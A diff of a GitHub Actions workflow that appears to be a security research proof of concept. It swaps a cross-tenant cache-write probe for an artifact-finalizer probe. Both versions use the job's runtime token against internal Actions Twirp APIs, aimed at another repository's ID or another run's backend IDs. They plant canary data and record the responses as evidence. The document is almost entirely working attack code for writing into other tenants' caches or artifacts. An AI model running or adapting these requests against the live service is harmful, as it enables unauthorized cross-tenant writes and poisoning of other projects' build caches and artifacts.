@@ -1,83 +1,59 @@
-name: G06 Cache Cross Tenant Writer
+name: G06 Artifact Foreign Finalizer Probe
 on:
   workflow_dispatch:
   push:
     branches: [main]
 jobs:
-  crosswrite:
+  probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Write A namespace cache canary
+      - name: Prepare foreign artifact archive
+        run: |
+          mkdir -p artifact_probe
+          echo B_ARTIFACT_FOREIGN_CANARY_V1 > artifact_probe/canary.txt
+          zip -q -j out-foreign-artifact.zip artifact_probe/canary.txt
+      - name: Probe A artifact finalizer
         uses: actions/github-script@v7
         env:
-          TARGET_REPOSITORY_ID: "1291730291"
-          CACHE_KEY: "ab-crosswrite-poc-28846338784-v7"
-          CACHE_VERSION: "357d0a072080a0f6ba43dc91a33e305dc51385dc675d5f953cec5f279bd5393f"
+          TARGET_RUN_BACKEND_ID: "30869057094"
+          TARGET_JOB_BACKEND_ID: "91867039871"
+          ARTIFACT_NAME: "g06-foreign-artifact-v1"
         with:
           script: |
             const fs = require("fs");
-            const { execFileSync } = require("child_process");
-            fs.mkdirSync("ab_cache", { recursive: true });
-            fs.mkdirSync("out", { recursive: true });
-            fs.writeFileSync("ab_cache/cache.txt", "B_CACHE_CROSSWRITE_CANARY_V7_20260804\n");
-            execFileSync("tar", ["--use-compress-program=zstd", "-cf", "out/cache.tzst", "ab_cache"]);
+            const crypto = require("crypto");
             const base = (process.env.ACTIONS_RESULTS_URL || "").replace(/\/$/, "");
             const token = process.env.ACTIONS_RUNTIME_TOKEN || "";
-            const key = process.env.CACHE_KEY;
-            const version = process.env.CACHE_VERSION;
-            const metadata = { repository_id: Number(process.env.TARGET_REPOSITORY_ID), scope: [{ scope: "refs/heads/main", permission: 3 }] };
             const headers = { Authorization: "Bearer " + token, "Content-Type": "application/json", Accept: "application/json" };
-            const body = { key, version, metadata };
-            const create = await fetch(base + "/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", { method: "POST", headers, body: JSON.stringify(body) });
+            const createBody = { workflowRunBackendId: process.env.TARGET_RUN_BACKEND_ID, workflowJobRunBackendId: process.env.TARGET_JOB_BACKEND_ID, name: process.env.ARTIFACT_NAME, mimeType: { value: "application/zip" }, version: 7 };
+            const create = await fetch(base + "/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact", { method: "POST", headers, body: JSON.stringify(createBody) });
             const createText = await create.text();
-            console.log("CREATE_HTTP", create.status, createText);
-            fs.writeFileSync("out/create-request.json", JSON.stringify(body));
-            fs.writeFileSync("out/create-response.json", createText);
-            fs.writeFileSync("out/env-summary.txt", JSON.stringify({ base, tokenLength: token.length, repository: process.env.GITHUB_REPOSITORY, repositoryId: process.env.GITHUB_REPOSITORY_ID }));
+            console.log("ARTIFACT_CREATE_HTTP", create.status, createText);
+            fs.mkdirSync("out-artifact", { recursive: true });
+            fs.writeFileSync("out-artifact/create-request.json", JSON.stringify(createBody));
+            fs.writeFileSync("out-artifact/create-response.json", createText);
             let uploadStatus = "not-run";
             let finalizeStatus = "not-run";
-            let lookupStatus = "not-run";
-            let downloadStatus = "not-run";
             if (create.ok) {
-              const signed = JSON.parse(createText).signed_upload_url;
-              const archive = fs.readFileSync("out/cache.tzst");
-              const upload = await fetch(signed, { method: "PUT", headers: { "Content-Type": "application/octet-stream", "x-ms-blob-type": "BlockBlob" }, body: archive });
+              const archive = fs.readFileSync("out-foreign-artifact.zip");
+              const upload = await fetch(JSON.parse(createText).signedUploadUrl, { method: "PUT", headers: { "Content-Type": "application/zip" }, body: archive });
               uploadStatus = String(upload.status);
-              const uploadText = await upload.text();
-              console.log("UPLOAD_HTTP", upload.status, uploadText);
-              fs.writeFileSync("out/upload-response.txt", "UPLOAD_HTTP=" + upload.status + "\n" + uploadText);
-              const finalizeBody = { key, version, size_bytes: archive.length };
-              const finalize = await fetch(base + "/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload", { method: "POST", headers, body: JSON.stringify(finalizeBody) });
+              await upload.text();
+              console.log("ARTIFACT_UPLOAD_HTTP", upload.status);
+              const digest = crypto.createHash("sha256").update(archive).digest("hex");
+              const finalizeBody = { workflowRunBackendId: process.env.TARGET_RUN_BACKEND_ID, workflowJobRunBackendId: process.env.TARGET_JOB_BACKEND_ID, name: process.env.ARTIFACT_NAME, size: String(archive.length), hash: { value: "sha256:" + digest } };
+              const finalize = await fetch(base + "/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact", { method: "POST", headers, body: JSON.stringify(finalizeBody) });
               finalizeStatus = String(finalize.status);
               const finalizeText = await finalize.text();
-              console.log("FINALIZE_HTTP", finalize.status, finalizeText);
-              fs.writeFileSync("out/finalize-response.json", finalizeText);
-              const lookup = await fetch(base + "/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", { method: "POST", headers, body: JSON.stringify({ metadata, key, version }) });
-              lookupStatus = String(lookup.status);
-              const lookupText = await lookup.text();
-              console.log("FOREIGN_NAMESPACE_LOOKUP_HTTP", lookup.status, lookupText);
-              fs.writeFileSync("out/foreign-lookup-response.json", lookupText);
-              if (lookup.ok) {
-                const foreignSigned = JSON.parse(lookupText).signed_download_url;
-                const foreignDownload = await fetch(foreignSigned);
-                downloadStatus = String(foreignDownload.status);
-                const foreignArchive = Buffer.from(await foreignDownload.arrayBuffer());
-                fs.writeFileSync("out/finalized-cache.tzst", foreignArchive);
-                fs.writeFileSync("out/foreign-download-response.txt", "FOREIGN_DOWNLOAD_HTTP=" + foreignDownload.status + " BYTES=" + foreignArchive.length);
-                if (foreignDownload.ok) {
-                  fs.mkdirSync("verified", { recursive: true });
-                  execFileSync("tar", ["--use-compress-program=zstd", "-xf", "out/finalized-cache.tzst", "-C", "verified"]);
-                  const finalCanary = fs.readFileSync("verified/ab_cache/cache.txt", "utf8").trim();
-                  console.log("FOREIGN_NAMESPACE_CANARY", finalCanary);
-                  fs.writeFileSync("out/foreign-consumer-proof.txt", "target_repository_id=" + process.env.TARGET_REPOSITORY_ID + "\ncanary=" + finalCanary + "\n");
-                }
-              }
+              console.log("ARTIFACT_FINALIZE_HTTP", finalize.status, finalizeText);
+              fs.writeFileSync("out-artifact/finalize-request.json", JSON.stringify(finalizeBody));
+              fs.writeFileSync("out-artifact/finalize-response.json", finalizeText);
             }
-            fs.writeFileSync("out/summary.txt", "CREATE_HTTP=" + create.status + "\nUPLOAD_HTTP=" + uploadStatus + "\nFINALIZE_HTTP=" + finalizeStatus + "\nFOREIGN_NAMESPACE_LOOKUP_HTTP=" + lookupStatus + "\nFOREIGN_NAMESPACE_DOWNLOAD_HTTP=" + downloadStatus);
-            if (!create.ok || !["200", "201"].includes(uploadStatus) || finalizeStatus !== "200" || lookupStatus !== "200" || downloadStatus !== "200") throw new Error("CACHE_WRITE_OR_READ_FAILED");
-      - name: Upload crosswrite evidence
+            fs.writeFileSync("out-artifact/summary.txt", "CREATE_HTTP=" + create.status + "\nUPLOAD_HTTP=" + uploadStatus + "\nFINALIZE_HTTP=" + finalizeStatus);
+            if (!create.ok) throw new Error("ARTIFACT_CREATE_FAILED");
+      - name: Upload artifact probe evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: g06-cache-crosswrite-evidence
-          path: out
+          name: g06-artifact-foreign-finalizer-evidence
+          path: out-artifact
